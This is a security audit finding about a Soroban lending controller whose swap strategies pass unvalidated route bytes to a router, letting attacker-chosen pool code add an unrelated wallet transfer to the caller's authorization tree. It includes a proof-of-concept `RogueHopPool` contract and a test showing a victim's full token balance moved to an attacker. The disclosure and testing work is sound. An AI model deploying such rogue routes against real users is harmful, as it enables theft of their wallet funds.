### Title
Untrusted swap route can append caller-authorized token transfers - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
`swap_collateral` and the other controller strategies forward attacker-influenced `swap: Bytes` to the configured router while the position owner’s top-level authorization remains active. If that payload routes through attacker-controlled contract code, the nested code can invoke a token `transfer` from the caller to the attacker; Soroban records it as a child of the caller’s authorization tree and executes it when the user signs that tree. The controller’s exact input authorization, measured router output, and final risk checks do not bound this unrelated wallet transfer.

### Finding Description
`swap_collateral(caller, account_id, current, amount, new, swap)` accepts a caller-supplied `Bytes` route after checking only that the caller owns or delegates the account. [1](#0-0)  It reaches `withdraw_and_swap_from_supply`, which ultimately calls `swap_tokens`. [2](#0-1)  `swap_tokens` sends the raw `StrategySwap` bytes to `execute_strategy` without decoding or validating the route’s nested venues. [3](#0-2) 

The controller separately authorizes only the exact input transfer from the controller to the router, with no sub-invocations. [4](#0-3)  After the router returns, it only verifies that controller input did not increase, spending did not exceed `amount_in`, and output increased. [5](#0-4)  None of those checks inspect transfers made from the `caller` by route-selected code under the caller’s broader transaction authorization.

The repository’s harness demonstrates the exact mechanism: a route-selected `RogueHopPool` calls `token.transfer(victim, attacker, amount)`, simulation records that transfer as a child beneath Alice’s `swap_collateral` authorization, and execution moves her unrelated wallet token while the account receives the expected swap output. [6](#0-5) [7](#0-6) 

### Impact Explanation
An attacker can steal arbitrary token balances held by the position owner, not merely the routed collateral amount. [8](#0-7)  The attack can target assets unrelated to the lending market because the malicious child call names the token, victim, recipient, and amount. [9](#0-8)  The strategy can still satisfy its measured output and post-operation risk requirements, so the transaction appears economically successful while the wallet theft occurs in the same authorization tree. [5](#0-4) [10](#0-9) 

### Likelihood Explanation
The attacker needs only to get the victim to submit a malicious `swap` payload and sign the authorization tree it produces. This is realistic where route bytes are produced by an external quote, strategy payload, analytics interface, or another untrusted source rather than constructed locally. The affected public path is reachable by an account owner or delegate through `swap_collateral`; the same raw `swap` boundary is shared by `swap_debt`, `repay_debt_with_collateral`, and `multiply`. [11](#0-10)  The likelihood is bounded by user interaction: a wallet or client that decodes the route and rejects unexpected authorization children can refuse the transaction, but the contract itself provides no such guard. [12](#0-11) 

### Recommendation
Decode and validate strategy route bytes inside the controller before invoking the router, including an allowlist of permitted venue contracts and token addresses for the requested conversion. Reject payloads that introduce any venue or token outside the declared `token_in`, `token_out`, and approved venue set. At the client boundary, require the caller’s authorization tree for a controller swap to contain no unrelated child token transfer before signing. [12](#0-11) 

### Proof of Concept
1. Deploy `RogueHopPool`, whose `swap()` calls `wallet_token.transfer(victim, attacker, victim_balance)`. [9](#0-8) 
2. Build a route whose router pulls the intended collateral input, invokes the rogue pool, then returns a normal positive output to the controller. [13](#0-12) 
3. Have Alice call `swap_collateral(alice, account_id, USDC, 50_000_000_000, ETH, malicious_route)`. [14](#0-13) 
4. Simulation records Alice’s controller authorization with an additional child `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`. [15](#0-14) 
5. If Alice signs that tree, her wallet token balance becomes zero, the attacker receives the full balance, and the account still receives the expected ETH collateral output. [16](#0-15)

### Citations

**File:** contracts/controller/src/lib.rs (L255-300)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L67-76)
```rust
    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-46)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L55-70)
```rust
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-157)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
